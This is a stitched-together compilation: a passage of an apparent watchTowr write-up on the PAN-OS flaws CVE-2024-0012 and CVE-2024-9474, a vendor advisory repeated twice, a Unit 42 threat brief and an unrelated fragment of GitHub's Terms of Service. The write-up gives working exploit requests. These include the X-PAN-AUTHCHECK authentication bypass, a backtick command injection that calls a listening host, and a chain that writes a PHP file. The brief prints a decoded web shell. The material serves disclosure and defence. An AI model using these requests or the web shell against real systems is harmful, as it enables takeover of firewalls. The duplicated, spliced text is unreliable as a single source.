                Util::login($_SERVER['QUERY_STRING']);
            } else {
                Util::login();
            }
            exit(1);
        }
    }
}

```

As you can see above, we present to you an example of PAN-OS's management interface auth boundary - the check that compares the HTTP header `HTTP_X_PAN_AUTHCHECK` with the ASCII value `off`.

Initially, on seeing this code, we took the world for what it is and thought - perhaps we could just specify `X-Pan-Authcheck: off` in our requests to disable authentication entirely - but, as ever, life is not that simple. Our requests still resulted in a login page - clearly, not what we want.

After some more digging, we found that the `X-Pan-Authcheck` header is set by default to `on` via the `/etc/nginx/conf/proxy_default.conf` file:

```
# default proxy request header setting
proxy_set_header Host $host;
proxy_set_header X-Real-IP $remote_addr;
proxy_set_header X-Real-Scheme $scheme;
proxy_set_header X-Real-Port $server_port;
proxy_set_header X-Real-Server-IP $server_addr;
proxy_set_header X-Forwarded-For  $proxy_add_x_forwarded_for;
proxy_set_header X-pan-ndpp-mode $pan_ndpp_mode;
proxy_set_header Proxy "";
proxy_set_header X-pan-AuthCheck $panAuthCheck;
proxy_max_temp_file_size 0;

```

This configuration file is included in the primary Nginx file - but, there is a mistake. More later.

Throughout the Nginx configuration, the value of $panAuthCheck is toggled based on the routes being called.

For example, the `/unauth/` dir, which (as youâd expect) requires no auth, is handled like this:

```
if ($uri ~ ^\\/unauth\\/.+$) {
  set $panAuthCheck 'off';
}
```

Looked fun, but - why read, when you can continue to diff?

Fortunately, there is only a small variation change between `10.2.12-h1` and `10.2.12-h2` , only a 5MB difference in size - how hard could it be?

Like most diffing adventures, we mounted the `vdmk`'s to an Ubuntu instance and extracted the whole file system; after hours of looking, mysteriously, no difference could be discovered.

Not accepting the possibility that the patch was somehow invisible to the naked eye, we had an idea. Having spent some time recently diving through FortiManagerâs file system, which holds the root filesystem in memory, as opposed to on disk, we thought - could it be Palo Alto have a similar setup, but with their patch process? Could it be that the patch is applied at boot-time, every time the appliance is started?

After booting up each respective version and jailbreaking them, we began painfully extracting the file system using SCP.

Whilst there was no significant change, there was enough to get our noses pointing in the direction.

# Phase 1 - Authentication Bypass - CVE-2024-0012

Looking at the primary Nginx route configuration - `/etc/nginx/conf/locations.conf` - revealed quite a limited (yet impactful) change:

```
add_header Allow "GET, HEAD, POST, PUT, DELETE, OPTIONS";
 if ($request_method !~ ^(GET|HEAD|POST|PUT|DELETE|OPTIONS)$) {
   return 405;

   proxy_pass_header Authorization;
+  include conf/proxy_default.conf;
   proxy_pass http://$gohost$gohostExt;
 }

```

While it doesnât look like much, thereâs enough here to deduce the entry point to CVE-2024-0012.

What does this tell us? Well, two vital things.

Firstly, we can see that a bunch of request headers are now being set before any definitions of routes or processing takes place, where they weren't - most importantly, this `X-pan-AuthCheck` value that controls authentication is now being set to `on` by default before any route handling is defined.

Secondly, we can see that `conf/proxy_default.conf` (where default headers are also set, including X-pan-AuthCheck) has been added to the handler for `.js.map` URIs - where before this was set later.

Doing some quick deductions, it looks like the authentication header wasnât correctly set by Nginx previously within this directive in previous unpatched versions - could this allow us to abuse the proxypass declaration to send requests that did not have the HTTP request header X-pan-Authcheck configured, to supposedly 'protected' endpoints?

Leveraging our knowledge of Nginx proxypass abuse cases, we pondered about the state of enterprise-grade security appliances that everyone trusts to secure their communications and internal networks - and blasted variations to see if any would allow us through, for example:

```
/php/ztp_gate.php%3f.js.map
/php/ztp_gate.php?.js.map
/php/ztp_gate.php#.js.map
/php/ztp_gate.php/.js.map

```

None of which worked:

```
GET /php/ztp_gate.php/.js.map HTTP/1.1
Host: 18.142.51.124

HTTP/1.1 302 Found

```

We were somewhat glum, until a bright light came on over our heads.

The `uiEnvSetup.php` script expects the `HTTP_X_PAN_AUTHCHECK` value to be set to `off`, something that was blocked by Nginx previously. Maybe we can just supply it?

Slightly more enlightened - we tried again:

```

```

We simplyâ¦ supply the `off` value to the `X-PAN-AUTHCHECK` HTTP request header, and the server helpfully turns off authentication?! At this point, why is anyone surprised?

Thatâs right folks, a simple reproducer for **CVE-2024-0012.** It couldn't be easier than that.

On to phase 2, the privesc vulnerability!

# Phase 2 - Privilege Escalation - CVE-2024-9474

#

Now the floodgates are open, and there is all sorts of post-authentication PHP functionality now within our grasp. Typically from this point, itâs down to our creativity to find the next step to RCE.

Letâs take a look at what the threat actors found by continuing our diff.

One file that stood out to us like a sore thumb was the change in `/var/appweb/htdocs/php-packages/panui_core/src/log/AuditLog.php` , which reveals a quite honest command injection:

```
<?php

namespace panui_core\log;

use pan_core\InjectableClass;
use pan_process\Process;
use pan_process\ShellSanitizer;

class AuditLog extends InjectableClass
{
  public function write($username, $message) {
    /** @var ShellSanitizer */
    $s = $this->ioc->get(ShellSanitizer::class);
    $msg = $s->escapeshellarg($message);

    /** @var Process */
    $p = $this->ioc->get(Process::class);
-    return $p->pexecute("/usr/local/bin/pan_elog -u audit -m $msg -o $username");
+    $u = $s->escapeshellarg($username);
+    return $p->pexecute("/usr/local/bin/pan_elog -u audit -m $msg -o $u");
  }
}
```

It couldnât be more straightforward than this.

Somehow a user is able to pass a username containing shell metacharacters into the `AuditLog.write()` function, which then passes its value to `pexecute()` .

Looking at other changes, we discovered a file with quite a large change - `/var/appweb/htdocs/php/utils/createRemoteAppwebSession.php`.

```

> Before we go further, our understanding for this functionality is a little insane.

> **Our understanding** is that this functionality is for users of Palo Alto Panorama to effectively 'jump into' connected SSLVPN/firewall devices - as you can see above though, with no actual authentication (i.e. valid password) required. This functionality allows a Palo Alto Panorma device to specify the user, user role and more that they would like to impersonate - and in a very friendly way, be provided with a fully authenticated, 2FA-not-required, valid PHP session ID.

When first looking at this, it's quite clear the functionality appears to be creating a PHP session - for a seemingly arbitrary user, and seemingly arbitrary role - based on the values of POST parameters passed in the HTTP request received.

For a second, we were thrown off by the introduced length checks - was this about to become some unusual memory corruption vulnerability? And then we chuckled, because never has anything remotely looking like complexity been needed with an appliance.

Our theory was simple - the value being passed via the 'user' parameter was likely going into $\_SESSION['userName'] that as we saw above was the source of what looked like a patch for a command injection vulnerability.

Fret not - we decided to proceed and created a valid HTTP request, using our aforementioned auth bypass, and an HTTP post parameter value for the 'user' key containing a simple `curl` command to our external listening host:

```
POST /php/utils/createRemoteAppwebSession.php/aaaa.js.map HTTP/1.1
Host: {{Hostname}}
X-PAN-AUTHCHECK: off
Content-Type: application/x-www-form-urlencoded
Content-Length: 99

user=`curl {{listening-host}}`&userRole=superuser&remoteHost=&vsys=vsys1

```

This returns us a nice PHP session ID value:

```
HTTP/1.1 200 OK
Date: Tue, 19 Nov 2024 09:06:44 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 48
Connection: keep-alive
Set-Cookie: PHPSESSID=isbhbjpdkhvmkhio0hcpsgmtk6; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Cache-Control: no-cache; no-store

@start@PHPSESSID=isbhbjpdkhvmkhio0hcpsgmtk6@end@

```

A quick look at the file system shows our payload is sitting tight within the sessionâs contents, and as expected, in the 'userName' key (i.e. $\_SESSION['userName']):

```
[root@PA-VM /]# cat ./opt/pancfg/mgmt/phpsessions/sess_isbhbjpdkhvmkhio0hcpsgmtk6
cmsRemoteSession|s:1:"1";panorama_sessionid|s:5:"dummy";user|s:16:"XXXX";userName|s:52:"`curl {{listening-host}}`";userRole|s:9:"superuser"

```

Weâd like to be honest here and give the complete trace down of where this vulnerability actually is, source-to-sink but, well, sometimes you just need to use a sledgehammer instead of tweezers.

With our payload injected into the correct location, we set out to blast all endpoints with our shiny `PHPSESSID` . As the code affected by the command injection was in audit log writing code, we just took a punt and fired our request - with our newly minted and forged PHP session at index.php.

```
GET /index.php/.js.map HTTP/1.1
Host: {{Hostname}}
Cookie: PHPSESSID=2jq4l1nv43idudknmhj830vdde;
X-PAN-AUTHCHECK: off
Connection: keep-alive

```

The command under the hood looks a little like this (thanks **pspy**!):

```
CMD: UID=0     PID=87502  | sh -c export panusername="`curl {{listening-host}}`";export superuser="1";export isxml="yes";/usr/local/bin/sdb -e -n ha.app.local.state

```

Please pause. It's 2024. We've made our point, so we'll say nothing more.

The full chain looks something like this:

```
POST /php/utils/createRemoteAppwebSession.php/watchTowr.js.map HTTP/1.1
Host: {{Hostname}}
X-PAN-AUTHCHECK: off
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

user=`echo $(uname -a) > /var/appweb/htdocs/unauth/watchTowr.php`&userRole=superuser&remoteHost=&vsys=vsys1

```
```
GET /index.php/.js.map HTTP/1.1
Host: {{Hostname}}
Cookie: PHPSESSID=2qe3kouhjdm8317f6vmueh1m8n;
X-PAN-AUTHCHECK: off
Connection: keep-alive

```
```
GET /unauth/watchTowr.php HTTP/1.1
Host: 192.168.1.227
Cookie: PHPSESSID=fvepfik7vrmvdlkns30rgpn1jb;
X-PAN-AUTHCHECK: off
Connection: keep-alive

```

This results in our injected command being executed:

```
HTTP/1.1 200 OK
Date: Tue, 19 Nov 2024 09:39:17 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 108

```
### Summary

So, yet another super-duper secure next-generation hardened security appliance popped.

This time itâs due to those pesky backticks, combined with the super-complicated step of simply asking the server not to check our authentication via `X-PAN-AUTHCHECK`.

![](https://labs.watchtowr.com/content/images/2024/11/image-36.png)

Itâs amazing that these two vulnerabilities got into a production appliance, amazingly allowed via the hacked-together mass of shell script invocations that lurk under the hood of a Palo Alto appliance.

Usual readers might be expecting a nice PoC, and while weâd love to provide one, weâre holding off on this one for a week or so to allow administrators time to patch - but instead, weâre releasing a Nuclei template that you can use to check if your hosts are affected [here](https://github.com/watchtowrlabs/palo-alto-panos-cve-2024-0012/tree/main?ref=labs.watchtowr.com).

AtÂ [watchTowr](https://www.watchtowr.com/?ref=labs.watchtowr.com), we believe continuous security testing is the future, enabling the rapid identification of holistic high-impact vulnerabilities that affect your organisation.

It's our job to understand how emerging threats, vulnerabilities, and TTPs affect your organisation.

### Description

An authentication bypass in Palo Alto Networks PAN-OS software enables an unauthenticated attacker with network access to the management web interface to gain PAN-OS administrator privileges to perform administrative actions, tamper with the configuration, or exploit other authenticated privilege escalation vulnerabilities like [CVE-2024-9474](https://security.paloaltonetworks.com/CVE-2024-9474).

The risk of this issue is greatly reduced if you secure access to the management web interface by restricting access to only trusted internal IP addresses according to our recommendedÂ [best practice deployment guidelines](https://live.paloaltonetworks.com/t5/community-blogs/tips-amp-tricks-how-to-secure-the-management-access-of-your-palo/ba-p/464431).

This issue is applicable only to PAN-OS 10.2, PAN-OS 11.0, PAN-OS 11.1, and PAN-OS 11.2 software on PA-Series, VM-Series, and CN-Series firewalls and on Panorama (virtual and M-Series).

Cloud NGFW and Prisma Access are not impacted by this vulnerability.

### Product Status

| Versions | Affected | Unaffected |
| Cloud NGFW | None | All |
| PAN-OS 11.2 | < 11.2.4-h1 | >= 11.2.4-h1 |
| PAN-OS 11.1 | < 11.1.5-h1 | >= 11.1.5-h1 |
| PAN-OS 11.0 | < 11.0.6-h1 | >= 11.0.6-h1 |
| PAN-OS 10.2 | < 10.2.12-h2 | >= 10.2.12-h2 |
| PAN-OS 10.1 | None | All |
| Prisma Access | None | All |

See the Solution section for additional fixes to commonly deployed maintenance releases.

### Required Configuration for Exposure

The risk is greatest if you configure the management interface to enable access from the internet or any untrusted network either:

1. Directly
   or
2. Through a dataplane interface that includes a management interface profile.

The risk is greatly reduced if you make sure that only trusted internal IP addresses are allowed to access the management interface.

Use the following steps to identify your recently detected devices in our Internet scans:

1. To find your known assets that require remediation action, visit the Assets section of Customer Support Portal atÂ [https://support.paloaltonetworks.com](https://support.paloaltonetworks.com/)Â (Products â Assets â All Assets â Remediation Required).
2. The list of your known devices with an internet-facing management interface discovered in our scans are tagged with PAN-SA-2024-0015 with a last seen timestamp in UTC. If no such devices are listed, it indicates our scan did not find any devices with internet-facing management interface for your account in the last three days.

GlobalProtect Portals and Gateways are not vulnerable to this issue. However, if a management profile is configured on interfaces with GlobalProtect portals or gateways, then it exposes the device to attacks via the management web interface (typically accessible on port 4443) in such cases.

### Severity: CRITICAL, Suggested Urgency: HIGHEST

The risk is highest when you allow access to the management interface from external IP addresses on the internet.

If you configure restricted access to a jump box that is the only system allowed to access the management interface, you greatly reduce the risk of exploitation because attacks would require privileged access using only those IP addresses.

### Workarounds and Mitigations

Recommended mitigationâThe vast majority of firewalls already follow Palo Alto Networks and industry best practices. However, if you havenât already, we strongly recommend that you secure access to your management interface according to our best practice deployment guidelines. Specifically, you should restrict access to the management interface to only trusted internal IP addresses to prevent external access from the internet.

Additionally, if you have a Threat Prevention subscription, you can block these attacks using Threat IDs 95746, 95747, 95752, 95753, 95759, and 95763 (available in Applications and Threats content version 8915-9075 and later). For these Threat IDs to protect against attacks for this vulnerability,

* Ensure that all the listed Threat IDs are set to block mode,
* [Route incoming traffic for the MGT port through a DP port](https://docs.paloaltonetworks.com/best-practices/10-1/administrative-access-best-practices/administrative-access-best-practices/deploy-administrative-access-best-practices#id59206398-3dab-4b2f-9b4b-7ea500d036ba), e.g., enabling management profile on a DP interface for management access,
* [Replace the Certificate for Inbound Traffic Management](https://docs.paloaltonetworks.com/best-practices/10-1/administrative-access-best-practices/administrative-access-best-practices/deploy-administrative-access-best-practices#id112f7714-8995-4496-bbf9-781e63dec71c),
* [Decrypt inbound traffic to the management interface so the firewall can inspect it](https://docs.paloaltonetworks.com/best-practices/10-1/administrative-access-best-practices/administrative-access-best-practices/deploy-administrative-access-best-practices#idbbd82587-17a2-42b4-9245-d3714e1e13a2), and
* Enable threat prevention on the inbound traffic to management services.

### Frequently Asked Questions

#### Q. Are there any IoCs associated with threat activity?

> Please refer to the Unit42 Threat Brief (<https://unit42.paloaltonetworks.com/cve-2024-0012-cve-2024-9474/>) for the latest information.

#### Q. Are there any checks I can run on my device to look for evidence of attempted exploitation activity?

> If your management web interface was exposed to the internet, then we advise you to closely monitor your network for suspicious threat activity, such as unrecognized configuration changes or suspicious users.
>
> We are scanning Telemetry data and customer uploaded tech support files (TSF) for evidence of threat activity and updating the case notes accordingly.

#### Q. Can I use Xpanse and XSIAM to identify PAN-OS management interfaces?

> Cortex Xpanse and Cortex XSIAM customers with the ASM module can investigate internet-exposed instances by reviewing alerts generated by the Palo Alto Networks Firewall Admin Login attack surface rule.

#### Q. If our firewall management interface has always been deployed according to best practices, do I need to take any action?

> We recommend applying the available fixes. Until then, follow the guidance in the Workarounds and Mitigations section.

#### Q. What do you recommend if exploitation was observed on my device?

> Please take your device offline from the internet and contact Global Customer Support to do an Enhanced Factory Reset (EFR) on your device.
>
> The following Knowledge Base Article outlines the steps to remediate your device using EFR: <https://knowledgebase.paloaltonetworks.com/KCSArticleDetail?id=kA14u000000CrO6CAK>

#### Q. How did you identify that my firewall had an internet-facing management interface?

> Palo Alto Networks detects public-facing customer NGFW internet management interfaces through routine, nonintrusive internet scanning. We analyze these results using proprietary indicators to attribute device attributes (such as firewall model) with a high degree of accuracy. Based on detected IP addresses, we are able to associate an internet-exposed firewall with the appropriate customer by cross-referencing the IP address to the serial number stored in our internal records.
>
> We listed the firewalls that were discovered in this way since November 9 in the Remediation Required list under the Assets section of the Customer Support Portal (Products â Assets â All Assets â Remediation Required). This list may not be complete, so make sure to verify that all of your firewalls are properly configured.

#### Q. Are GlobalProtect Portals and Gateways vulnerable to this issue?

> GlobalProtect Portals and Gateways (typically accessible on port 443) are not vulnerable to this issue. However, if a management profile is configured on interfaces with GlobalProtect portals or gateways, then it exposes the device to attacks via the management web interface (typically accessible on port 4443) in such cases.

### Description

An authentication bypass in Palo Alto Networks PAN-OS software enables an unauthenticated attacker with network access to the management web interface to gain PAN-OS administrator privileges to perform administrative actions, tamper with the configuration, or exploit other authenticated privilege escalation vulnerabilities like [CVE-2024-9474](https://security.paloaltonetworks.com/CVE-2024-9474).

The risk of this issue is greatly reduced if you secure access to the management web interface by restricting access to only trusted internal IP addresses according to our recommendedÂ [best practice deployment guidelines](https://live.paloaltonetworks.com/t5/community-blogs/tips-amp-tricks-how-to-secure-the-management-access-of-your-palo/ba-p/464431).

This issue is applicable only to PAN-OS 10.2, PAN-OS 11.0, PAN-OS 11.1, and PAN-OS 11.2 software on PA-Series, VM-Series, and CN-Series firewalls and on Panorama (virtual and M-Series).

Cloud NGFW and Prisma Access are not impacted by this vulnerability.

### Required Configuration for Exposure

The risk is greatest if you configure the management interface to enable access from the internet or any untrusted network either:

1. Directly
   or
2. Through a dataplane interface that includes a management interface profile.

The risk is greatly reduced if you make sure that only trusted internal IP addresses are allowed to access the management interface.

Use the following steps to identify your recently detected devices in our Internet scans:

1. To find your known assets that require remediation action, visit the Assets section of Customer Support Portal atÂ [https://support.paloaltonetworks.com](https://support.paloaltonetworks.com/)Â (Products â Assets â All Assets â Remediation Required).
2. The list of your known devices with an internet-facing management interface discovered in our scans are tagged with PAN-SA-2024-0015 with a last seen timestamp in UTC. If no such devices are listed, it indicates our scan did not find any devices with internet-facing management interface for your account in the last three days.

GlobalProtect Portals and Gateways are not vulnerable to this issue. However, if a management profile is configured on interfaces with GlobalProtect portals or gateways, then it exposes the device to attacks via the management web interface (typically accessible on port 4443) in such cases.

### Severity: CRITICAL, Suggested Urgency: HIGHEST

The risk is highest when you allow access to the management interface from external IP addresses on the internet.

If you configure restricted access to a jump box that is the only system allowed to access the management interface, you greatly reduce the risk of exploitation because attacks would require privileged access using only those IP addresses.

### Workarounds and Mitigations

Recommended mitigationâThe vast majority of firewalls already follow Palo Alto Networks and industry best practices. However, if you havenât already, we strongly recommend that you secure access to your management interface according to our best practice deployment guidelines. Specifically, you should restrict access to the management interface to only trusted internal IP addresses to prevent external access from the internet.

Additionally, if you have a Threat Prevention subscription, you can block these attacks using Threat IDs 95746, 95747, 95752, 95753, 95759, and 95763 (available in Applications and Threats content version 8915-9075 and later). For these Threat IDs to protect against attacks for this vulnerability,

* Ensure that all the listed Threat IDs are set to block mode,
* [Route incoming traffic for the MGT port through a DP port](https://docs.paloaltonetworks.com/best-practices/10-1/administrative-access-best-practices/administrative-access-best-practices/deploy-administrative-access-best-practices#id59206398-3dab-4b2f-9b4b-7ea500d036ba), e.g., enabling management profile on a DP interface for management access,
* [Replace the Certificate for Inbound Traffic Management](https://docs.paloaltonetworks.com/best-practices/10-1/administrative-access-best-practices/administrative-access-best-practices/deploy-administrative-access-best-practices#id112f7714-8995-4496-bbf9-781e63dec71c),
* [Decrypt inbound traffic to the management interface so the firewall can inspect it](https://docs.paloaltonetworks.com/best-practices/10-1/administrative-access-best-practices/administrative-access-best-practices/deploy-administrative-access-best-practices#idbbd82587-17a2-42b4-9245-d3714e1e13a2), and
* Enable threat prevention on the inbound traffic to management services.

### Frequently Asked Questions

#### Q. Are there any IoCs associated with threat activity?

> Please refer to the Unit42 Threat Brief (<https://unit42.paloaltonetworks.com/cve-2024-0012-cve-2024-9474/>) for the latest information.

#### Q. Are there any checks I can run on my device to look for evidence of attempted exploitation activity?

> If your management web interface was exposed to the internet, then we advise you to closely monitor your network for suspicious threat activity, such as unrecognized configuration changes or suspicious users.
>
> We are scanning Telemetry data and customer uploaded tech support files (TSF) for evidence of threat activity and updating the case notes accordingly.

#### Q. Can I use Xpanse and XSIAM to identify PAN-OS management interfaces?

> Cortex Xpanse and Cortex XSIAM customers with the ASM module can investigate internet-exposed instances by reviewing alerts generated by the Palo Alto Networks Firewall Admin Login attack surface rule.

#### Q. If our firewall management interface has always been deployed according to best practices, do I need to take any action?

> We recommend applying the available fixes. Until then, follow the guidance in the Workarounds and Mitigations section.

#### Q. What do you recommend if exploitation was observed on my device?

> Please take your device offline from the internet and contact Global Customer Support to do an Enhanced Factory Reset (EFR) on your device.
>
> The following Knowledge Base Article outlines the steps to remediate your device using EFR: <https://knowledgebase.paloaltonetworks.com/KCSArticleDetail?id=kA14u000000CrO6CAK>

#### Q. How did you identify that my firewall had an internet-facing management interface?

> Palo Alto Networks detects public-facing customer NGFW internet management interfaces through routine, nonintrusive internet scanning. We analyze these results using proprietary indicators to attribute device attributes (such as firewall model) with a high degree of accuracy. Based on detected IP addresses, we are able to associate an internet-exposed firewall with the appropriate customer by cross-referencing the IP address to the serial number stored in our internal records.
>
> We listed the firewalls that were discovered in this way since November 9 in the Remediation Required list under the Assets section of the Customer Support Portal (Products â Assets â All Assets â Remediation Required). This list may not be complete, so make sure to verify that all of your firewalls are properly configured.

#### Q. Are GlobalProtect Portals and Gateways vulnerable to this issue?

> GlobalProtect Portals and Gateways (typically accessible on port 443) are not vulnerable to this issue. However, if a management profile is configured on interfaces with GlobalProtect portals or gateways, then it exposes the device to attacks via the management web interface (typically accessible on port 4443) in such cases.

## Executive Summary

Palo Alto Networks and Unit 42 continue to track exploitation activity related to CVE-2024-0012 and CVE-2024-9474. We are working with external researchers, partners and customers to share information transparently and rapidly.

**Fixes for both vulnerabilities are available**. Please refer to the Palo Alto Networks Security Advisories ([CVE-2024-0012](https://security.paloaltonetworks.com/CVE-2024-0012), [CVE-2024-9474](https://security.paloaltonetworks.com/CVE-2024-9474)) for additional details about recommended solutions and affected products.

An authentication bypass in Palo Alto Networks PAN-OS software ([CVE-2024-0012](https://security.paloaltonetworks.com/CVE-2024-0012)) enables an unauthenticated attacker with network access to the management interface to gain PAN-OS administrator privileges. This could allow an adversary to perform administrative actions, tamper with the configuration or exploit other authenticated privilege escalation vulnerabilities like [CVE-2024-9474](https://security.paloaltonetworks.com/CVE-2024-9474).

**The risk of these issues is greatly reduced if you secure access to the management web interface by restricting access to only trusted internal IP addresses** according to our recommended [best practice deployment guidelines](https://live.paloaltonetworks.com/t5/community-blogs/tips-amp-tricks-how-to-secure-the-management-access-of-your-palo/ba-p/464431).

Palo Alto Networks has actively monitored and worked with customers to identify and further minimize the very small number of PAN-OS devices with management web interfaces exposed to the internet or other untrusted networks.

Palo Alto Networks originally identified threat activity potentially exploiting CVE-2024-0012 and and CVE-2024-9474 against a limited number of management web interfaces. Palo Alto Networks continues to track additional threat activity following the public release of technical insights and artifacts by third-party researchers beginning on Nov. 19, 2024. The [Current Scope of the Attack](#post-137539-_50343o6a6han) section includes more information about the observed activity. Information about observed indicators and surrounding context is available in the [Indicators of Compromise](#post-137539-_ydqdbjg0dngh) section, while a more complete list of IOCs is available at the [Unit42-Timely-Threat-Intel GitHub](https://github.com/PaloAltoNetworks/Unit42-Threat-Intelligence-Article-Information/blob/main/2024-November-IOC-updates-OperationLunarPeek.txt).

We are tracking the initial exploitation of this vulnerability under the name **Operation Lunar Peek**.

If you havenât already, **Palo Alto Networks also strongly recommends that customers secure access to your management interface according to our recommended [best practice deployment guidelines](https://live.paloaltonetworks.com/t5/community-blogs/tips-amp-tricks-how-to-secure-the-management-access-of-your-palo/ba-p/464431)**. Specifically, you should restrict access to the management interface to only trusted internal IP addresses to prevent external access from the internet. The vast majority of firewalls already follow Palo Alto Networks and industry best practices.

Please refer to the Palo Alto Networks Security Advisories ([CVE-2024-0012](https://security.paloaltonetworks.com/CVE-2024-0012), [CVE-2024-9474](https://security.paloaltonetworks.com/CVE-2024-9474)) for up-to-date information about affected products and versions, as well as more remediation guidance.

For assistance related to a potential compromise, please reach out to [Palo Alto Networks support](https://support.paloaltonetworks.com/). Unit 42 Retainer customers can reach out to Unit 42 directly.

## Details of the CVE-2024-0012 and CVE-2024-9474 Vulnerabilities

An authentication bypass in Palo Alto Networks PAN-OS software ([CVE-2024-0012](https://security.paloaltonetworks.com/CVE-2024-0012)) enables an unauthenticated attacker with network access to the management interface to gain PAN-OS administrator privileges. This could allow an adversary to perform administrative actions, tamper with the configuration or exploit other authenticated privilege escalation vulnerabilities like [CVE-2024-9474](https://security.paloaltonetworks.com/CVE-2024-9474).

**The risk of these issues is greatly reduced if you secure access to the management web interface by restricting access to only trusted internal IP addresses** according to our recommended [best practice deployment guidelines](https://live.paloaltonetworks.com/t5/community-blogs/tips-amp-tricks-how-to-secure-the-management-access-of-your-palo/ba-p/464431).

Please refer to the Palo Alto Networks Security Advisories ([CVE-2024-0012](https://security.paloaltonetworks.com/CVE-2024-0012), [CVE-2024-9474](https://security.paloaltonetworks.com/CVE-2024-9474)) for up-to-date information about affected products and versions, as well as more remediation guidance.

## Current Scope of the Attack

Palo Alto Networks originally identified threat activity targeting a limited number of device management web interfaces. This original activity, reported on Nov. 18, 2024, primarily originated from IP addresses known to proxy/tunnel traffic for anonymous VPN services.

Unit 42 is actively clustering and characterizing this originally observed threat activity. Originally observed post-exploitation activity included interactive command execution and dropping malware, such as web shells, on the firewall.

Web shell payloads recovered from compromised firewalls were obfuscated. One decoded payload sample (SHA256: 3C5F9034C86CB1952AA5BB07B4F77CE7D8BB5CC9FE5C029A32C72ADC7E814668) is presented below:

<?php $z="system";
if(${"\_POST"}["b"]=="iUqPd")
{
$z(${"\_POST"}["x"]);
};

| 12345 | <?php $z="system";if(${"\_POST"}["b"]=="iUqPd"){Â Â Â Â $z(${"\_POST"}["x"]);}; |
| --- | --- |

The below user-agent string has been observed during multiple actor exploit attempts.

User-Agent:Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv 11.0) like Gecko

| 1 | User-Agent:Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv 11.0) like Gecko |

Unit 42 recommends **monitoring for and investigating any suspicious or otherwise abnormal activity on devices with a management web interface exposed to the internet**, as exact post-compromise activity and payloads may vary.

Palo Alto Networks is still actively investigating and remediating all identified threat activity. Palo Alto Networks observed a notable increase in threat activity following the public release of technical insights and artifacts by third-party researchers beginning on Nov. 19, 2024. At this time, **Unit 42 assesses with high confidence that a functional exploit chaining CVE-2024-0012 and CVE-2024-9474 is publicly available, which will enable broader threat activity**.

Unit 42 continues to also observe **both manual and automated scanning activity** aligning with the timeline of third-party artifacts becoming widely available. In agreement with [third-party reporting](https://arcticwolf.com/resources/blog/arctic-wolf-observes-threat-campaign-targeting-palo-alto-networks-firewall-devices/), Unit 42 has also observed increased diversity of post-compromise activity to include additional payloads such as open-source C2 tools as well as crypto miners.

A list of IP addresses and surrounding context are available in [Indicators of Compromise](#post-137539-_ydqdbjg0dngh), while a more complete list of IOCs is available at the [Unit42-Timely-Threat-Intel GitHub](https://github.com/PaloAltoNetworks/Unit42-Threat-Intelligence-Article-Information/blob/main/2024-November-IOC-updates-OperationLunarPeek.txt).

Unit 42 will continue to update this additional information as relevant data is available and sharable.

## Remediation Guidance

Palo Alto Networks recommends that customers update to receive the latest patches that fix CVE-2024-0012 andÂ CVE-2024-9474. Please refer to the Palo Alto Networks Security Advisories ([CVE-2024-0012](https://security.paloaltonetworks.com/CVE-2024-0012), [CVE-2024-9474](https://security.paloaltonetworks.com/CVE-2024-9474))Â for up-to-date information about affected products and versions.

If you havenât already, **Palo Alto Networks also strongly recommends that customers secure access to your management interface according to our recommended best practice deployment guidelines**. Specifically, you should restrict access to the management interface to only trusted internal IP addresses to prevent external access from the internet. The vast majority of firewalls already follow Palo Alto Networks and industry best practices.

## Conclusion

Palo Alto Networks has shared our findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.

## Indicators of Compromise

### Command and Control Infrastructure

An increasingly high volume of threat actor IP addresses have been identified attempting to scan and/or connect to management web interfaces to exploit CVE-2024-0012 and CVE-2024-9474.

Many of these IP addresses have been known to proxy/tunnel traffic for anonymous VPN services, which may include legitimate user activity originating from these IPs to other destinations.

Unit 42 has also observed both manual and automated scanning originating from various IP addresses. This activity has greatly increased in volume and scope following the public release of technical insights and artifacts by third-party researchers beginning on Nov. 19, 2024.

A more complete list of observed IP addresses is available at the [Unit42-Timely-Threat-Intel GitHub](https://github.com/PaloAltoNetworks/Unit42-Threat-Intelligence-Article-Information/blob/main/2024-November-IOC-updates-OperationLunarPeek.txt). Unit 42 will continue to update relevant values as additional information is available and sharable.

## [The GitHub Terms of Service](#the-github-terms-of-service)

Effective date: November 16, 2020

## [A. Definitions](#a-definitions)

**Short version:** *We use these basic terms throughout the agreement, and they have specific meanings. You should know what we mean when we use each of the terms. There's not going to be a test on it, but it's still useful information.*

1. An "Account" represents your legal relationship with GitHub. A âPersonal Accountâ represents an individual Userâs authorization to log in to and use the Service and serves as a Userâs identity on GitHub. âOrganizationsâ are shared workspaces that may be associated with a single entity or with one or more Users where multiple Users can collaborate across many projects at once. A Personal Account can be a member of any number of Organizations.
2. The âAgreementâ refers, collectively, to all the terms, conditions, notices contained or referenced in this document (the âTerms of Serviceâ or the "Terms") and all other operating rules, policies (including the GitHub Privacy Statement, available at [github.com/site/privacy](https://github.com/site/privacy)) and procedures that we may publish from time to time on the Website. Most of our site policies are available at [docs.github.com/categories/site-policy](/en/site-policy).
3. "Beta Previews" mean software, services, or features identified as alpha, beta, preview, early access, or evaluation, or words or phrases with similar meanings.
4. âContentâ refers to content featured or displayed through the Website, including without limitation code, text, data, articles, images, photographs, graphics, software, applications, packages, designs, features, and other materials that are available on the Website or otherwise available through the Service. "Content" also includes Services. âUser-Generated Contentâ is Content, written or otherwise, created or uploaded by our Users. "Your Content" is Content that you create or own.
5. âGitHub,â âWe,â and âUsâ refer to GitHub, Inc., as well as our affiliates, directors, subsidiaries, contractors, licensors, officers, agents, and employees.
6. The âServiceâ refers to the applications, software, products, and services provided by GitHub, including any Beta Previews.
7. âThe User,â âYou,â and âYourâ refer to the individual person, company, or organization that has visited or is using the Website or Service; that accesses or uses any part of the Account; or that directs the use of the Account in the performance of its functions. A User must be at least 13 years of age. Special terms may apply for business or government Accounts (See [Section B(5): Additional Terms](#5-additional-terms)).
